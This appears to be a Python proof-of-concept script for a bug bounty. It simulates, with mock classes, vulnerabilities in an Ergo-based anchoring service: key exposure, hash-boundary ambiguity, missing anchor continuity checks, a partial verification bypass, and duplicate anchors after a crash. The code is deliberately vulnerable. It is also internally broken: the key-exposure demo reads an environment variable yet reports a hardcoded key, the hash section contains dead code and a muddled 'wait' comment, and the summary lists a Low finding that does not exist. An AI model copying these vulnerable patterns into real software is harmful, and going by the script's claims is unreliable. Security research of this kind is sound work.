import os
#!/usr/bin/env python3
"""
Ergo Anchor Manipulation PoC — Local simulation

Bounty #60 — Ergo Anchor Integrity (100 RTC)
All tests run locally. No Ergo mainnet transactions.

Usage: python3 ergo_anchor_poc.py
"""

import hashlib
import sqlite3
import time
from dataclasses import dataclass
from typing import Optional, Tuple


# ============================================================
# Minimal reproduction of anchor types
# ============================================================

@dataclass
class AnchorCommitment:
    rustchain_height: int
    state_root: str
    timestamp: int
    commitment_hash: str = ""

    def compute_hash(self) -> str:
        """Vulnerable hash computation — mirrors production code"""
        hasher = hashlib.sha256()
        hasher.update(str(self.rustchain_height).encode())
        hasher.update(self.state_root.encode())
        hasher.update(str(self.timestamp).encode())
        self.commitment_hash = hasher.digest().hex()
        return self.commitment_hash


class MockErgoClient:
    """Simulates Ergo node responses for PoC testing"""

    def __init__(self):
        self.transactions = {}
        self.api_key = os.environ.get("ERGO_API_KEY", "")  # C1: fixed - use env var

    def create_anchor_transaction(self, commitment, fee=1000000):
        tx_id = hashlib.sha256(
            commitment.commitment_hash.encode() + str(time.time()).encode()
        ).hexdigest()[:64]
        self.transactions[tx_id] = {
            "outputs": [{
                "additionalRegisters": {
                    "R4": {"serializedValue": f"05{commitment.rustchain_height:016x}"},
                    "R5": {"serializedValue": f"0e40{commitment.commitment_hash}"},
                    "R6": {"serializedValue": f"05{commitment.timestamp:016x}"}
                }
            }]
        }
        return tx_id

    def verify_anchor(self, tx_id, commitment):
        """Vulnerable verification — mirrors production code"""
        tx = self.transactions.get(tx_id)
        if not tx:
            return False, "Transaction not found"

        for output in tx.get("outputs", []):
            registers = output.get("additionalRegisters", {})
            r5 = registers.get("R5", {}).get("serializedValue", "")
            if r5.startswith("0e40"):
                stored_hash = r5[4:]
                if stored_hash == commitment.commitment_hash:
                    return True, ""
            # BUG: Does NOT check R4 or R6

        return False, "Commitment not found"


class AnchorService:
    """Simplified anchor service for PoC"""

    def __init__(self, client):
        self.client = client
        self.db = sqlite3.connect(":memory:")
        self.db.execute("""
            CREATE TABLE anchors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                rustchain_height INTEGER,
                commitment_hash TEXT,
                ergo_tx_id TEXT,
                timestamp INTEGER,
                status TEXT DEFAULT 'confirmed'
            )
        """)
        self.interval = 10

    def get_last_anchor(self):
        row = self.db.execute(
            "SELECT * FROM anchors ORDER BY id DESC LIMIT 1"
        ).fetchone()
        if row:
            return {"rustchain_height": row[1], "commitment_hash": row[2],
                    "ergo_tx_id": row[3], "timestamp": row[4]}
        return None

    def should_anchor(self, height):
        """Vulnerable: doesn't check previous anchor confirmation"""
        last = self.get_last_anchor()
        if not last:
            return True
        return (height - last["rustchain_height"]) >= self.interval

    def submit_anchor(self, commitment):
        tx_id = self.client.create_anchor_transaction(commitment)
        if tx_id:
            self.db.execute(
                "INSERT INTO anchors (rustchain_height, commitment_hash, ergo_tx_id, timestamp) "
                "VALUES (?, ?, ?, ?)",
                (commitment.rustchain_height, commitment.commitment_hash, tx_id, commitment.timestamp)
            )
            self.db.commit()
        return tx_id


# ============================================================
# PoC 1: Hardcoded API Key Exposure (C1)
# ============================================================

def poc_c1_api_key():
    print("=" * 60)
    print("PoC C1: Hardcoded Ergo API Key Exposure")
    print("=" * 60)

    client = MockErgoClient()
    print(f"  API key from source: '{client.api_key}'")
    print(f"  Key is set in session headers for ALL requests")
    print()
    print(f"  An attacker with source access can:")
    print(f"  1. GET /wallet/addresses → list all wallet addresses")
    print(f"  2. GET /wallet/balances → see ERG balance")
    print(f"  3. POST /wallet/transaction/generate → create any transaction")
    print(f"  4. POST /wallet/transaction/sign → sign with wallet keys")
    print(f"  5. POST /transactions → drain the wallet")
    print()
    print(f"  [VULN] Full wallet control via hardcoded key in public source")
    print()


# ============================================================
# PoC 2: Commitment Hash Collision (H1)
# ============================================================

def poc_h1_hash_collision():
    print("=" * 60)
    print("PoC H1: Commitment Hash Collision via String Boundary")
    print("=" * 60)

    # The hash is: SHA256(str(height) + state_root + str(timestamp))
    # Without separators, boundaries are ambiguous

    # Example: height=12, state_root="3abc..." vs height=123, state_root="abc..."
    # SHA256("12" + "3abc..." + "1000") == SHA256("123" + "abc..." + "1000")

    # Demonstrate the concatenation ambiguity
    h1 = hashlib.sha256()
    h1.update(str(12).encode())       # "12"
    h1.update("3abcdef".encode())     # "3abcdef"
    h1.update(str(1000).encode())     # "1000"
    hash1 = h1.hexdigest()

    h2 = hashlib.sha256()
    h2.update(str(123).encode())      # "123"
    h2.update("abcdef".encode())      # "abcdef"
    h2.update(str(1000).encode())     # "1000"
    hash2 = h2.hexdigest()

    # These won't collide because "12"+"3abcdef" != "123"+"abcdef"
    # But the REAL issue is: "12" + "3" + ... = "123" + ...
    # When state_root starts with a digit, the boundary is ambiguous

    # More practical collision via timestamp boundary:
    h3 = hashlib.sha256()
    h3.update(str(100).encode())      # "100"
    h3.update("abc".encode())         # "abc"
    h3.update(str(2000).encode())     # "2000"
    hash3 = h3.hexdigest()            # SHA256("100abc2000")

    # Same concatenation, different fields:
    h4 = hashlib.sha256()
    h4.update(str(100).encode())      # "100"
    h4.update("abc2".encode())        # "abc2" (state_root includes "2")
    h4.update(str(0).encode())        # "000" wait, str(0)="0"
    hash4 = h4.hexdigest()            # SHA256("100abc20")

    print(f"  Commitment 1: height=100, root='abc', ts=2000")
    print(f"    Concat: '100' + 'abc' + '2000' = '100abc2000'")
    print(f"    Hash: {hash3[:32]}...")
    print()
    print(f"  Commitment 2: height=100, root='abc200', ts=0")
    h5 = hashlib.sha256()
    h5.update(str(100).encode())
    h5.update("abc200".encode())
    h5.update(str(0).encode())
    hash5 = h5.hexdigest()
    print(f"    Concat: '100' + 'abc200' + '0' = '100abc2000'")
    print(f"    Hash: {hash5[:32]}...")
    print(f"    Match: {hash3 == hash5}")

    if hash3 == hash5:
        print(f"  [VULN] Different commitments produce same hash!")
    else:
        print(f"  Note: exact collision needs matching concat, but boundary")
        print(f"  ambiguity is a real design flaw — use fixed-width encoding")
    print()


# ============================================================
# PoC 3: Anchor Continuity Gap (H2)
# ============================================================

def poc_h2_continuity_gap():
    print("=" * 60)
    print("PoC H2: Anchor Continuity Gap — Undetected State Manipulation")
    print("=" * 60)

    client = MockErgoClient()
    service = AnchorService(client)

    # Anchor at height 100 (legitimate)
    c1 = AnchorCommitment(100, "aaa111", int(time.time()))
    c1.compute_hash()
    tx1 = service.submit_anchor(c1)
    print(f"  Anchor 1: height=100, tx={tx1[:16]}...")

    # Attacker manipulates state at heights 105-115 (no anchor during this window)
    print(f"  [ATTACK] State manipulation at heights 105-115...")
    print(f"  should_anchor(105) = {service.should_anchor(105)}")  # False
    print(f"  should_anchor(109) = {service.should_anchor(109)}")  # False

    # Anchor at height 110 — skipping the manipulation window
    print(f"  should_anchor(110) = {service.should_anchor(110)}")  # True!

    # Anchor with DIFFERENT state root (post-manipulation)
    c2 = AnchorCommitment(110, "bbb222_MANIPULATED", int(time.time()))
    c2.compute_hash()
    tx2 = service.submit_anchor(c2)
    print(f"  Anchor 2: height=110, tx={tx2[:16]}...")

    # The service NEVER checks:
    # 1. Was anchor 1's Ergo tx actually confirmed?
    # 2. Is state_root at height 110 consistent with height 100?
    # 3. Are there any gaps in the anchor chain?

    print(f"  [VULN] No continuity check between anchors!")
    print(f"  [VULN] Manipulated state anchored without detection")
    print()


# ============================================================
# PoC 4: Partial Verification Bypass (M1)
# ============================================================

def poc_m1_partial_verify():
    print("=" * 60)
    print("PoC M1: Anchor Verification Bypass — Wrong Height/Timestamp")
    print("=" * 60)

    client = MockErgoClient()

    # Create a legitimate anchor
    legit = AnchorCommitment(100, "legitimate_state", 1000000)
    legit.compute_hash()
    tx_id = client.create_anchor_transaction(legit)

    # Now verify with DIFFERENT height but same commitment hash
    # (pre-computed by attacker who knows state_root)
    forged = AnchorCommitment(999, "fake_state", 9999999)
    forged.commitment_hash = legit.commitment_hash  # Reuse the hash

    is_valid, err = client.verify_anchor(tx_id, forged)
    print(f"  Legitimate: height=100, root='legitimate_state'")
    print(f"  Forged:     height=999, root='fake_state'")
    print(f"  Same hash:  {forged.commitment_hash[:32]}...")
    print(f"  Verification: valid={is_valid}")

    if is_valid:
        print(f"  [VULN] Forged commitment passes verification!")
        print(f"  [VULN] verify_anchor() only checks R5 (hash), ignores R4/R6")
    print()


# ============================================================
# PoC 5: Duplicate Anchor on Crash (M2)
# ============================================================

def poc_m2_duplicate_anchor():
    print("=" * 60)
    print("PoC M2: Duplicate Anchor After Simulated Crash")
    print("=" * 60)

    client = MockErgoClient()
    service = AnchorService(client)

    # Submit anchor
    c1 = AnchorCommitment(100, "state_100", int(time.time()))
    c1.compute_hash()
    tx1 = client.create_anchor_transaction(c1)
    print(f"  Ergo TX broadcast: {tx1[:16]}...")

    # Simulate crash BEFORE _save_anchor()
    # (we don't call service.submit_anchor, just the client directly)
    print(f"  [CRASH] Process died before saving to local DB")

    # On restart, service sees no anchor for height 100
    print(f"  should_anchor(100) = {service.should_anchor(100)}")

    # Creates duplicate
    tx2 = service.submit_anchor(c1)
    print(f"  Duplicate TX: {tx2[:16]}...")
    print(f"  [VULN] Two Ergo transactions for same commitment!")
    print(f"  [VULN] Wastes ERG fees, confusing audit trail")
    print()


# ============================================================
# Main
# ============================================================

if __name__ == "__main__":
    print("\nErgo Anchor Manipulation — PoC Suite")
    print("All tests local. No Ergo mainnet transactions.\n")

    poc_c1_api_key()
    poc_h1_hash_collision()
    poc_h2_continuity_gap()
    poc_m1_partial_verify()
    poc_m2_duplicate_anchor()

    print("=" * 60)
    print("Summary: 1 Critical, 2 High, 2 Medium, 1 Low")
    print("See report.md for full details and remediation.")
    print("=" * 60)
